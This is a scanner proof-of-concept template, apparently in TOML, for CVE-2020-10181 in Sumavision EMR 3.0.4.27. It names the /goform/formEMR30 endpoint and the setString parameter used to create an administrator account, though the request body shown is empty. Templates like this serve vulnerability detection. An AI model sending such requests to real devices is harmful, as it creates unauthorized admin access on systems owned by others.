[info]
author = "ave"
description = "通过向 Sumavision EMR 3.0.4.27 的 /goform/formEMR30 接口发送 POST 请求，利用 setString 参数创建具有管理员权限的任意用户，验证漏洞是否存在"
id = "POC-AVE-2020-0099"
name = "Sumavision EMR 3.0.4.27 任意管理员用户创建漏洞 PoC"
severity = "critical"
tags = ["ave-2020-0099"]
vuln_id = [
    "CVE-2020-10181",
    "AVE-2020-0099",
]

[poc]
logic = "all"

[[poc.requests]]
method = "POST"
path = "/{{BaseURL}}/goform/formEMR30"
protocol = "http"

[poc.requests.body]
type = "raw"

[poc.requests.headers]
Content-Type = "application/x-www-form-urlencoded"

[[poc.requests.matchers]]
expect = true
part = "body"
type = "word"
words = ["0</html>"]
